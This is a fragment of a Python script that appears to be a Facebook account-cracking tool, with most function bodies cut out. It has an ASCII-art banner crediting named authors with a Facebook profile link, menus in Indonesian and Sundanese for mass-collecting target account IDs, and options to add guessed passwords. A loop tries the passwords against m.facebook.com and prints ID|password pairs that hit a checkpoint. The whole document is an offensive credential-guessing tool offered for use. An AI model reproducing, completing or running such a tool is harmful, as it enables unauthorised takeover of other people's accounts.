...
#  #   #    #  #  #  # #    #  # #  
###    ###### #    # # #    #   #   
#  #   #    # ###### # #####    #  حﻼﺻ يﺮﻴﺧ/Khairy Salah  
#   #  #    # #    # # #   #    #   
#    # #    # #    # # #    #   #   \n""")
            
	nazri_ganteng(f"""(=){H} كﻮﻴﻨﻣ لﺎﺤﻟﺍ\n(=){M} KETU(=) KETUA : APEP PALING GANTENG
(=) ﻢﺳﻻﺍ  : حﻼﺻ يﺮﻴﺧ
(=) كﻮﺒﺴﻴﻓ: https://www.facebook.com/1.1.b.c.x
(=) ﻢﺳﻻﺍ+2: ﻲﻧﺎﺒﻌﻟﺍ دﺎﻳﺯ  
(=)  ﺪﻴﺻ  :  يﺪﻳﻻﺍ ﻞﻋ 
(=) ﺪﻠﺑ   :  🇱🇾 
(=) ## :  (حﻼﺻ يﺮﻴﺧ) : 🇱🇾🇱🇾\n(=)(حﻼﺻ يﺮﻴﺧ)\n(=){P} (حﻼﺻ يﺮﻴﺧ) : (حﻼﺻ يﺮﻴﺧ)\n(=) (حﻼﺻ يﺮﻴﺧ) : (حﻼﺻ يﺮﻴﺧ)\n(=) (حﻼﺻ يﺮﻴﺧ) : (حﻼﺻ يﺮﻴﺧ)\n(=) (حﻼﺻ يﺮﻴﺧ) : (حﻼﺻ يﺮﻴﺧ)\n(=) (حﻼﺻ يﺮﻴﺧ) : (حﻼﺻ يﺮﻴﺧ)\n(=) (حﻼﺻ يﺮﻴﺧ) : IKO""")
...
def menu(my_name,my_id):
	...
	nazri_ganteng('=' * 40)
	nazri_cool_banget = input('└─ PILIH NOMER 1 : ')
	nazri_ganteng('=' * 40)
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('└─ TARGET ID HAYANG BARAHA  ? : '))
	except ValueError:
		print('└─ AYENA NYOKOT ID KA FB : ')
		exit()
	if jum<1 or jum>100:
	...
	for met in range(jum):
		yz+=1
		kl = input('└─ AYENA NYOKOT ID KA FB : '+str(yz)+' : ')
		uid.append(kl)
	nazri_ganteng('=' * 40)
	for userr in uid:
		try:
...
def setting():
	...
	print('')
	print(f'''>> 1 m.facebook.com ''')
	print('')
	hc = input('╰─ KETIK 1 JING KONTOT : ')
	if hc in ['1','01']:
	...
	if pwplus in ['y','Y']:
		...
		pwku=input('KETIK PASWORD TAMBAHAN : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
...
def passwrd():
	...
	print(f'└─ MODE PESWATAKEN MUN NGS NYAMPE {m}500 ID MAH\n')
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'{K}RESULTS {tgl} {bln} {thn}')
				print(f'\rX CP {K}{idf}|{pw}\n{U}{ua}\n')
